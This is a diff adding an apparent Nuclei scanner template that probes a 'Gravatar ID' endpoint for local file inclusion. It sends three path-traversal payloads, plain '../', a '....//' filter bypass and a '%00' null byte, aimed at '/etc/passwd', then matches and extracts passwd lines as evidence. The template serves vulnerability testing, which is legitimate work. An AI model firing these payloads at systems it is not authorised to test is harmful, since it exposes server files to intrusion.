@@ -1,0 +1,63 @@
+id: custom-lfi-gravatar-id
+
+info:
+  name: Gravatar ID LFI Check
+  author: whitehat-ai
+  severity: medium
+  description: Tests for local file inclusion vulnerabilities in the Gravatar ID endpoint using path traversal payloads.
+  tags: lfi,path-traversal,local-file-inclusion
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "bin:"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: passwd-evidence
+        regex:
+          - "(?:root|bin):[x*]:[0-9]+:[0-9]+:"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=....//....//....//etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "bin:"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: passwd-evidence
+        regex:
+          - "(?:root|bin):[x*]:[0-9]+:[0-9]+:"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=/etc/passwd%00"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "bin:"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: passwd-evidence
+        regex:
+          - "(?:root|bin):[x*]:[0-9]+:[0-9]+:"
